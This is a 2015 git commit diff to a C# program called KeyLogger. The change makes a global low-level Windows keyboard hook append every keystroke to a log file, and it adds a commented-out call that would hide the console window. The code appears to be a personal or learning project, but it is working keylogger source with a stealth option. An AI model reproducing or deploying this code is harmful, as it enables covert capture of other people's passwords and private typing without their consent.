63a9cf7bd3f266f65c3a17560cca924c52c1951f
Shevchuk-Yuganets Andrew <mazillko@gmail.com>
2015-06-02 00:30:46 +0300

    Added ShowWindow WinApi function and key filtering

--- Shevchuk-Yuganets.Andrew/KeyLogger/Program.cs
+++ Shevchuk-Yuganets.Andrew/KeyLogger/Program.cs
@@ -1,19 +1,25 @@
 ﻿using System;
 using System.Diagnostics;
+using System.IO;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
 
 namespace KeyLogger
 {
-	class Program
+	internal class Program
 	{
+		const int SW_HIDE = 0;
+		const int SW_SHOW = 5;
 		private const int WH_KEYBOARD_LL = 13;
 		private const int WM_KEYDOWN = 0x0100;
-		private static LowLevelKeyboardProc _proc = HookCallback;
+		private static readonly LowLevelKeyboardProc _proc = HookCallback;
 		private static IntPtr _hookID = IntPtr.Zero;
 
 		public static void Main()
 		{
+			var hWnd = GetConsoleWindow();
+			// ShowWindow(hWnd, SW_HIDE); // hide console window
+			
 			_hookID = SetHook(_proc);
 			Application.Run();
 			UnhookWindowsHookEx(_hookID);
@@ -21,41 +27,64 @@ namespace KeyLogger
 
 		private static IntPtr SetHook(LowLevelKeyboardProc proc)
 		{
-			using (Process curProcess = Process.GetCurrentProcess())
-			using (ProcessModule curModule = curProcess.MainModule)
+			using (var curProcess = Process.GetCurrentProcess())
+			using (var curModule = curProcess.MainModule)
 			{
 				return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
 					GetModuleHandle(curModule.ModuleName), 0);
 			}
 		}
 
-		private delegate IntPtr LowLevelKeyboardProc(
-			int nCode, IntPtr wParam, IntPtr lParam);
-
 		private static IntPtr HookCallback(
 			int nCode, IntPtr wParam, IntPtr lParam)
 		{
-			if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+			if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN)
 			{
-				int vkCode = Marshal.ReadInt32(lParam);
-				Console.WriteLine((Keys)vkCode);
+				var vkCode = Marshal.ReadInt32(lParam);
+
+				using (var writer = new StreamWriter("keyLogger.log", true))
+				{
+					switch (vkCode)
+					{
+						case (int)Keys.Space:
+							writer.WriteAsync(String.Format(" {0} ", ((Keys)vkCode)));
+							break;
+						case (int)Keys.Return:
+							writer.WriteAsync(String.Format(" {0} ", ((Keys)vkCode)));
+							break;
+						default:
+							writer.WriteAsync(((Keys)vkCode).ToString());
+							break;
+					}
+				}
 			}
 			return CallNextHookEx(_hookID, nCode, wParam, lParam);
 		}
 
-		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-		private static extern IntPtr SetWindowsHookEx(int idHook,
-			LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+		#region WinApi Functions
+			[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+			private static extern IntPtr SetWindowsHookEx(int idHook,
+				LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
-		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-		[return: MarshalAs(UnmanagedType.Bool)]
-		private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+			[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+			[return: MarshalAs(UnmanagedType.Bool)]
+			private static extern bool UnhookWindowsHookEx(IntPtr hhk);
 
-		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
-			IntPtr wParam, IntPtr lParam);
+			[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+			private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+				IntPtr wParam, IntPtr lParam);
 
-		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-		private static extern IntPtr GetModuleHandle(string lpModuleName);
+			[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+			private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+			private delegate IntPtr LowLevelKeyboardProc(
+				int nCode, IntPtr wParam, IntPtr lParam);
+
+			[DllImport("kernel32.dll")]
+			static extern IntPtr GetConsoleWindow();
+
+			[DllImport("user32.dll")]
+			static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+		#endregion
 	}
 }
